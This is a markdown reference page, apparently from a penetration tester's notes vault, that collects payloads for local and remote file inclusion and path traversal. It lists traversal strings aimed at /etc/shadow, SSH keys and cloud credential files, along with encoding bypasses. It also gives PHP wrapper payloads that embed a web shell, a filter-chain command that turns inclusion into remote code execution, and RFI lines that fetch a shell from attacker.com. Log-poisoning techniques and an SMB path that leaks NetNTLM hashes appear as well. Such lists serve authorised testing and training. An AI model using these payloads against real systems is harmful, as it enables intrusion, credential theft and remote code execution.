---
title: "Payloads: LFI / RFI / Path Traversal"
type: payloads
tags: [payloads, lfi, rfi, path-traversal, php-wrappers, web]
sources: []
date_created: 2026-06-16
date_updated: 2026-06-16
---

# Payloads: LFI / RFI / Path Traversal

File read, file inclusion, and inclusion -> RCE. Routed via the `hunt-rce` / `hunt-injection` skills. See [[path-traversal-lfi]]; fuzz lists in [[wordlists]].

## Traversal + targets
```
../../../../etc/passwd          ..\..\..\..\windows\win.ini
/etc/passwd   /etc/hosts   /etc/shadow   /root/.bash_history
/proc/self/environ   /proc/self/cmdline   /proc/self/fd/0..20   /proc/self/maps
~/.ssh/id_rsa   ~/.aws/credentials   /var/log/auth.log   /var/log/apache2/access.log
web.config  .env  application.properties  wp-config.php  config.php  settings.py
# Windows: C:\windows\win.ini  \boot.ini  C:\inetpub\wwwroot\web.config  C:\xampp\php\php.ini
```

## Filter / encoding bypass
```
....//....//etc/passwd           # ../ stripped once (nested)
..%2f..%2f..%2fetc%2fpasswd       # url-encode
%252e%252e%252f                   # double-encode
..%c0%af..%c0%af                  # overlong UTF-8
..%25c0%25af                      # double-encoded overlong
/etc/passwd%00                    # null byte (PHP < 5.3.4)
/etc/passwd%00.png  ....;/        # null/suffix + extension append bypass
....\/....\/                      # mixed slashes
/var/www/../../etc/passwd         # absolute + traversal
/%2e%2e/%2e%2e/etc/passwd
path truncation: /etc/passwd/././././... (4096+ chars, old PHP)
```

## PHP wrappers - read source
```
php://filter/convert.base64-encode/resource=index.php          # base64 the source
php://filter/read=string.rot13/resource=config.php
php://filter/convert.iconv.utf-8.utf-16/resource=x.php          # mangle to dodge filters
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+   # <?php system($_GET['c']);?>
expect://id                                                     # if expect ext loaded
php://input    + POST body: <?php system($_GET['c']); ?>        # if include() + url_include
zip://shell.jpg%23payload.php     phar://shell.jpg/payload.php
compress.zlib://   glob://   ssh2://   ssh2.exec://
```

## PHP filter chain -> RCE (no upload, no log access)
Modern LFI->RCE: chain `convert.iconv` filters so the decoded output IS PHP code.
```bash
# generate the chain (synacktiv php_filter_chain_generator)
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]);?>'
# -> php://filter/convert.iconv.UTF8.CSISO2022KR|...|resource=/etc/passwd  (paste into the LFI param)
curl 'http://t/?page=php://filter/.../resource=/etc/passwd&c=id'
```

## RFI (remote file inclusion)
Needs `allow_url_include=On` (rare today, but check):
```
?page=http://attacker.com/shell.txt          # shell.txt = <?php system($_GET['c']); ?>
?page=http://attacker.com/shell.txt%00        # null terminate appended ext
?page=ftp://attacker.com/shell.txt
?page=\\attacker.com\share\shell.php          # SMB (Windows, also leaks NetNTLM to Responder)
?page=data://text/plain;base64,...            # data wrapper = RFI without a server
```

## LFI -> RCE (inclusion of attacker-controlled content)
```
log poisoning: send <?php system($_GET['c']);?> in User-Agent -> include /var/log/apache2/access.log (or nginx, vsftpd, mail, sshd auth.log for SSH user)
/proc/self/environ poisoning (UA in environ) -> include it
PHP session: write payload to a session var -> include /var/lib/php/sessions/sess_<PHPSESSID>
mail: inject into a mailbox -> include /var/mail/<user>
phar:// deserialization -> POP chain (no include of code needed)
/proc/self/fd/N (rotate N) when log path unknown
```

## Tools / fuzzing
```bash
ffuf -w lfi-traversal.txt -u 'http://t/?page=FUZZ' -mr "root:.*:0:0:"     # see [[wordlists]]
# nuclei DAST LFI template -> [[nuclei-arsenal]]
LFISuite / kadimus / liffy for automated LFI->RCE
```

## Real-world
php://filter chain-to-RCE is the current go-to LFI exploit (replaces log poisoning where logs are unreadable); `data://`/`expect://` and SMB-RFI (NetNTLM leak) are recurring CTF + real findings.
